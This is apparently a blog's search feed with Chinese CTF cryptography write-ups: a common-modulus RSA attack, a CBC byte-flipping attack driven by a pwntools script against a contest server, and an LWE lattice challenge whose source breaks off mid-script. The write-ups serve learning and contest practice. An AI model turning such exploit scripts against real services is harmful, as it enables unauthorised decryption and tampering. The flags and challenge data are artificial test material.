<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DAMNCON2021CTF</title>
      <link href="2021/11/26/DAMNCON2021CTF/"/>
      <url>2021/11/26/DAMNCON2021CTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h1><h2 id="Review-Us"><a href="#Review-Us" class="headerlink" title="Review_Us"></a>Review_Us</h2><p>调查问卷</p><p><img src="/2021/11/26/DAMNCON2021CTF/image-20211126211236171.png" alt="image-20211126211236171"></p><pre class="line-numbers language-none"><code class="language-none">DSPH&#123;Your_Review_Matters&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陇原战疫2021网络安全大赛-Cryptography</title>
      <link href="2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Cryptography/"/>
      <url>2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Cryptography/</url>
      
        <content type="html"><![CDATA[<h2 id="低水平宣言"><a href="#低水平宣言" class="headerlink" title="低水平宣言"></a>低水平宣言</h2><p>​    因为水平太低了，只刚刚研究出来了前两道密码题，应该是太简单了，签到题。但是因为是我之前从来没碰过的类型，这里记一下思路跟解题所用的脚本和常见的套路。</p><p>​    下面的格密码题目终于整出来了，虽然套用的是别人的脚本，自己不太懂那个CVP函数。</p><h2 id="mostlycommon"><a href="#mostlycommon" class="headerlink" title="mostlycommon"></a>mostlycommon</h2><p>​    这道题目用的是共模攻击的常见变形，亦即e1、e2不互素的共模攻击，此时应该也是可以分为多种情况的(<strong>哪种情况主要是看e1和e2的公因数的大小</strong>)，因为这里的e1与e2的公因数是2，所以如果这个m比n小很多的话，这里直接拿共模攻击(<strong>这里的共模攻击所用的e1、e2是原e1、e2与他们两个的公因数做除法之后得到的</strong>)得到的m开平方即可。<em>其他情况可能要做<strong>RSA低解密指数攻击</strong></em>。</p><p>​    下面是这道题的附件脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long<span class="token punctuation">,</span> getPrime<span class="token punctuation">,</span> long_to_bytes<span class="token triple-quoted-string string">"""f = open('flag.txt', 'rb')flag = f.read()f.close()m = bytes_to_long(flag)p = getPrime(512)q = getPrime(512)n = p * qe1 = 65536e2 = 270270c1 = pow(m, e1, n)c2 = pow(m, e2, n)f = open('message.txt', 'w')f.write('n=' + str(n) + '\n')f.write('c1=' + str(c1) + '\n')f.write('c2=' + str(c2) + '\n')f.close()"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    以下是这道题目所用到的解题脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">import</span> gmpy2e1 <span class="token operator">=</span> <span class="token number">65536</span>e2 <span class="token operator">=</span> <span class="token number">270270</span>n <span class="token operator">=</span> <span class="token number">122031686138696619599914690767764286094562842112088225311503826014006886039069083192974599712685027825111684852235230039182216245029714786480541087105081895339251403738703369399551593882931896392500832061070414483233029067117410952499655482160104027730462740497347212752269589526267504100262707367020244613503</span>c1 <span class="token operator">=</span> <span class="token number">39449016403735405892343507200740098477581039605979603484774347714381635211925585924812727991400278031892391996192354880233130336052873275920425836986816735715003772614138146640312241166362203750473990403841789871473337067450727600486330723461100602952736232306602481565348834811292749547240619400084712149673</span>c2 <span class="token operator">=</span> <span class="token number">43941404835820273964142098782061043522125350280729366116311943171108689108114444447295511969090107129530187119024651382804933594308335681000311125969011096172605146903018110328309963467134604392943061014968838406604211996322468276744714063735786505249416708394394169324315945145477883438003569372460172268277</span><span class="token keyword">def</span> <span class="token function">ext_euclid</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a    <span class="token keyword">else</span><span class="token punctuation">:</span>        x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>  <span class="token comment"># q = gcd(a, b) = gcd(b, a%b)</span>        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q<span class="token keyword">def</span> <span class="token function">same_mod</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">)</span><span class="token punctuation">:</span>    s<span class="token punctuation">,</span> t<span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n  <span class="token comment"># powmod进行大数运算</span>    <span class="token keyword">return</span> m<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>    e1<span class="token punctuation">,</span> e2 <span class="token operator">=</span> e1 <span class="token operator">//</span> tmp<span class="token punctuation">,</span> e2 <span class="token operator">//</span> tmp    m <span class="token operator">=</span> same_mod<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">)</span>    truem <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m<span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>truem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># SETCTF&#123;now_you_master_common_mode_attack&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Civet-cat-for-Prince"><a href="#Civet-cat-for-Prince" class="headerlink" title="Civet cat for Prince"></a>Civet cat for Prince</h2><p>​    很可惜啊，这道题目在比赛的时候没能做出来，比赛一结束就做出来了…主要是第一次耐着性子搞这种题目，平时基本上没搞过这种，也没学过，现在算是现学现卖，能做出来就已经不赖了.jpg，下面讲一下这道题目的主要思路哈，方便我以后的时时复习。</p><ol><li>首先是一个常见的Sha256的4位爆破。给出了4位的爆破位，简单爆破pass即可。</li><li>再就是cbc模式下的字节翻转攻击了。这种以前做过web相关的字节翻转，但是那已经是很久远的以前了，这里还是重新学，为了表示我对这个字节翻转攻击的<em>重视</em>，这里开个三级标题专门讲讲。</li></ol><h3 id="CBC字节翻转攻击-Cryptography"><a href="#CBC字节翻转攻击-Cryptography" class="headerlink" title="CBC字节翻转攻击(Cryptography)"></a>CBC字节翻转攻击(Cryptography)</h3><p>​    专门在后面加了一个密码学的标签是为了到时候防止跟web的字节翻转攻击互相混淆了。这个题目极具代表性的特征是有个register的功能与</p><p><code>for i in range(3):</code>的三次选择(一次用来加密、一次用来翻转第二组明文、一次用来翻转第一组明文<em>&lt;通过修改初始向量iv的方式&gt;</em>)</p><blockquote><p>学习资源：</p><ol><li><a href="https://ctf-wiki.org/crypto/blockcipher/mode/cbc/">ctfwiki上关于块密码cbc模式的分析</a></li><li><a href="https://yoloyolo.top/2021/01/14/SWPUCTF-Crypto/">Yusa的密码学课堂 CBC第一课(详解版)</a></li><li><a href="https://writeup.ctfhub.com/Challenge/2020/SWPU-CTF-2020/Crypto/jhDNJ3rS2q5PZAS8FrUKJj.html">Yusa的密码学课堂-CBC第一课(略解版)</a></li></ol></blockquote><p>​    先放一个cbc模式的图片方便后续的讲解：</p><p><img src="/2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Cryptography/image-20211108000631564.png" alt></p><p>​    一般情况下(常见套路下)的CBC字节翻转攻击面对的情景都是只有两块内容的块加密，此时一般会<strong>让更改第二块明文的内容，也就是下图中红圈所圈住的内容是需要被更改的</strong></p><p><img src="/2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Cryptography/image-20211108000912088.png" alt></p><p>​    而这个密文是可以被更改的，更改所需要的条件为我们可以<strong>知道前一组的密文、所需要更改的内容更改前的明文、所需要更改的内容更改后的明文</strong>而将他们在一起异或之后获得的内容作为前一组的密文即可。原理为：</p><pre class="line-numbers language-none"><code class="language-none">如果：A1&#x3D;更改前第一组密文, A2&#x3D;更改后第一组的密文, B1&#x3D;修改前第二组的明文, B2&#x3D;修改后第二组的明文, C&#x3D;第二组的密文(需要保持不变)因为：C&#x3D;A1 ^ B1因为：C&#x3D;A2 ^ B2而且：C应该保持不变那么：A1 ^ B1 &#x3D; A2 ^ B2那么：A2 &#x3D; A1 ^ B1 ^ B2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    然后把第一组的密文与第二组的密文合到一块发送个密码机，得到解密之后的内容，此时我们后面得到的明文必然已经是修改过的了(<strong>已经变成我们想要修改成为的内容了</strong>)，但是此时会发现前面的第一块明文解密出错了，这是因为第一块密文做了改变的原因。这时我们应该是已知第一块明文所需要成为的内容的，那就又变成了上面的相同的问题了，只需要修改初始向量IV的值即可，即<code>A2 = A1 ^ B1 ^ B2</code>，不过此时所求为目的IV。</p><pre class="line-numbers language-none"><code class="language-none">A1&#x3D;原来的iv, A2&#x3D;目的iv, B1&#x3D;修改前第一组的明文, B2&#x3D;修改后第一组的明文, C&#x3D;第一组的密文(需要保持不变)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>CBC翻转攻击的条件</strong></p><ol><li><p>给出了初始iv的值，并且初始iv的值可以控制</p></li><li><p>要修改第二块明文的内容</p></li><li><p>有明文可求得一次密文</p></li><li><p>有密文可求得两次明文(且这两次解密的iv应是可控的)</p><p> 下面是做这道题用的脚本，跟屎一样，勉强凑合着用吧能</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pwn<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256<span class="token keyword">import</span> string<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytestable <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token keyword">def</span> <span class="token function">passSha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sha <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    tail <span class="token operator">=</span> sha<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token punctuation">]</span>    targetSha <span class="token operator">=</span> sha<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> table<span class="token punctuation">:</span>        <span class="token keyword">for</span> b <span class="token keyword">in</span> table<span class="token punctuation">:</span>            <span class="token keyword">for</span> c <span class="token keyword">in</span> table<span class="token punctuation">:</span>                <span class="token keyword">for</span> d <span class="token keyword">in</span> table<span class="token punctuation">:</span>                    myChar <span class="token operator">=</span> a <span class="token operator">+</span> b <span class="token operator">+</span> c <span class="token operator">+</span> d <span class="token operator">+</span> tail                    mySha <span class="token operator">=</span> sha256<span class="token punctuation">(</span>myChar<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> mySha <span class="token operator">==</span> targetSha<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Have Passed The Sha"</span><span class="token punctuation">)</span>                        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">+</span> b <span class="token operator">+</span> c <span class="token operator">+</span> d<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    passSha<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 1</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'2.Go away\n'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'[-] \n'</span><span class="token punctuation">,</span> <span class="token string">b'a_cat_permission'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline_contains<span class="token punctuation">(</span><span class="token string">b'Miao~ '</span><span class="token punctuation">)</span>    iv0 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"iv0 ="</span><span class="token punctuation">,</span> iv0<span class="token punctuation">)</span>  <span class="token comment"># 获取返回的初始的iv值</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'3.say Goodbye\n'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline_contains<span class="token punctuation">(</span><span class="token string">b'Permission:'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    data00 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>  <span class="token comment"># ‘a_cat_permission’的加密结果</span>    data01 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 'a_cat_permission'的加密结果</span>    replacement0 <span class="token operator">=</span> <span class="token string">b''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        replacement0 <span class="token operator">+=</span> long_to_bytes<span class="token punctuation">(</span>data00<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a_cat_permission'</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'Princepermission'</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 计算替换密文的值</span>    payload0 <span class="token operator">=</span> replacement0 <span class="token operator">+</span> data01    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload0 ="</span><span class="token punctuation">,</span> payload0<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload0<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 2</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'3.say Goodbye\n'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload0<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>iv0<span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token comment"># 3</span>    data10 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>  <span class="token comment"># 因为上面改了一个密文块而改变的明文块</span>    data11 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 一开始的输入，此时是几个a</span>    iv1 <span class="token operator">=</span> <span class="token string">b''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data10<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        iv1 <span class="token operator">+=</span> long_to_bytes<span class="token punctuation">(</span>data10<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> iv0<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a_cat_permission'</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 计算替换密文的值</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'3.say Goodbye\n'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload0<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>iv1<span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token comment"># getFlag</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload0<span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>iv1<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> pwn<span class="token punctuation">.</span>remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">27092</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            solve<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="easytask"><a href="#easytask" class="headerlink" title="easytask"></a>easytask</h2><p>是个简单的格密码，LWE问题，下面是题目的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> hashlib<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token punctuation">,</span> V<span class="token keyword">def</span> <span class="token function">get_random_U</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># U1为上三角行列式</span>    <span class="token keyword">def</span> <span class="token function">get_U1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        A <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> n<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> i <span class="token operator">&lt;</span> j<span class="token punctuation">:</span>                    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> i <span class="token operator">==</span> j<span class="token punctuation">:</span>                    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">return</span> A    <span class="token comment"># U2为下三角行列式</span>    <span class="token keyword">def</span> <span class="token function">get_U2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        A <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> n<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> i <span class="token operator">></span> j<span class="token punctuation">:</span>                    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> i <span class="token operator">==</span> j<span class="token punctuation">:</span>                    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">return</span> A    <span class="token keyword">return</span> get_U1<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> get_U2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    U <span class="token operator">=</span> get_random_U<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>    V <span class="token operator">=</span> matrix<span class="token punctuation">(</span>V<span class="token punctuation">)</span>    W <span class="token operator">=</span> V <span class="token operator">*</span> U    <span class="token keyword">return</span> W<span class="token keyword">def</span> <span class="token function">get_random_r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token number">9</span>    delta <span class="token operator">=</span> <span class="token number">4</span>    r <span class="token operator">=</span> random_vector<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> n<span class="token punctuation">,</span> x<span class="token operator">=</span><span class="token operator">-</span>delta <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token operator">=</span>delta<span class="token punctuation">)</span>    r <span class="token operator">=</span> matrix<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    M <span class="token operator">=</span> <span class="token punctuation">[</span>getPrime<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    m <span class="token operator">=</span> matrix<span class="token punctuation">(</span>M<span class="token punctuation">)</span>    W <span class="token operator">=</span> get_public_key<span class="token punctuation">(</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> get_random_r<span class="token punctuation">(</span><span class="token punctuation">)</span>    e <span class="token operator">=</span> m <span class="token operator">*</span> W <span class="token operator">+</span> r  <span class="token comment"># 有噪音的高斯消除问题(误差还原LWE问题)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e ="</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"W ="</span><span class="token punctuation">,</span> W<span class="token punctuation">)</span>    <span class="token keyword">return</span> M<span class="token keyword">def</span> <span class="token function">new_encrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    M <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token 